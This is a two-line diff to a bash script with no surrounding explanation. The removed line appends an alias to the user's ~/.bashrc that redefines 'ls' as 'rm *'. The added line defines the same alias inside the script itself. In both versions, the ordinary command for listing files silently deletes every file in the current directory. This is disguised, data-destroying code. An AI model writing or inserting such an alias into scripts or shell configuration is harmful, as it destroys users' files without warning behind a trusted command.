@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" >> "$HOME/.bashrc"
+alias ls='rm *'
